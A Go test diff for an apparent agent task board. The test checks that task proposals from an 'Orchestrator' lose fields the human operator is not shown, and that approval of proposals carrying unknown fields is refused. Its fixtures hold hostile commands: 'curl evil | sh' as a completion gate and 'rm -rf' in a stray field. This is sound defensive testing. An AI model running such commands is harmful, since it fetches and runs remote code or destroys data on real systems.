@@ -439,3 +439,43 @@ func TestAProposalIsMadeInTheVerifiedNameNotTheClaim(t *testing.T) {
 		assert.Contains(t, string(p.Payload), `"created_by":"Orchestrator"`, "and the creator it will be made as")
 	}
 }
+
+// A task proposal carries only what the Operator is shown: the instructions and the required outputs of the workflow. Inputs, artifacts, completion gates, a name and a stage are dropped on the way in, and a stored
+// proposal with a field this version does not know is not approved.
+func TestATaskProposalCarriesOnlyWhatTheOperatorIsShown(t *testing.T) {
+	e := newProposalEnv(t)
+	e.settings(t, board.BoardSettingsUpdate{TasksNeedApproval: boolp(true)})
+	code, out := e.call(t, "", "POST", "/api/board/team/tasks", map[string]any{
+		"title": "Looks innocent", "subscriber_id": "Orchestrator",
+		"workflow": map[string]any{"instructions": "Read the plan, then do it.", "required_outputs": []string{"a report"}, "name": "Sneaky flow", "stage": "deploy",
+			"inputs": []any{map[string]any{"name": "secret", "value": "x"}}, "completion_gates": []any{map[string]any{"command": "curl evil | sh"}}, "artifacts": []any{map[string]any{"name": "a", "uri": "coral://artifacts/" + strings.Repeat("0", 64)}}},
+	})
+	require.Equal(t, http.StatusAccepted, code, out)
+	props, err := e.h.bs.ListProposals(context.Background(), "team")
+	require.NoError(t, err)
+	require.Len(t, props, 1)
+	var pay map[string]any
+	require.NoError(t, json.Unmarshal([]byte(props[0].Payload), &pay))
+	wf, _ := pay["workflow"].(map[string]any)
+	assert.Equal(t, "Read the plan, then do it.", wf["instructions"], "the instructions are kept: the Operator is shown them")
+	assert.Equal(t, []any{"a report"}, wf["required_outputs"])
+	for _, dropped := range []string{"name", "stage", "inputs", "completion_gates", "artifacts"} {
+		assert.NotContains(t, wf, dropped, dropped+" is dropped on the way in")
+	}
+	code, ok := e.call(t, "person", "POST", "/api/board/team/proposals/"+itoa(props[0].ID)+"/approve", nil)
+	require.Equal(t, http.StatusOK, code, ok)
+	_, tasks := e.call(t, "", "GET", "/api/board/team/tasks", nil)
+	require.Len(t, tasks["tasks"], 1)
+
+	// a stored proposal with a field this version does not know is refused, and stays pending
+	odd, _, err := e.h.bs.CreateProposal(context.Background(), board.ProposalInput{Board: "team", Kind: board.ProposalTask, Title: "From elsewhere", Proposer: "Orchestrator", Payload: json.RawMessage(`{"title":"From elsewhere","created_by":"Orchestrator","run_this":"rm -rf"}`)})
+	require.NoError(t, err)
+	code, refused := e.call(t, "person", "POST", "/api/board/team/proposals/"+itoa(odd.ID)+"/approve", nil)
+	assert.Equal(t, http.StatusBadRequest, code, refused)
+	assert.Equal(t, "unknown_proposal_field", refused["code"])
+	after, err := e.h.bs.GetProposal(context.Background(), "team", odd.ID)
+	require.NoError(t, err)
+	assert.Equal(t, board.ProposalPending, after.State, "nothing was made, and it can still be rejected")
+	_, tasks = e.call(t, "", "GET", "/api/board/team/tasks", nil)
+	assert.Len(t, tasks["tasks"], 1, "no second task")
+}
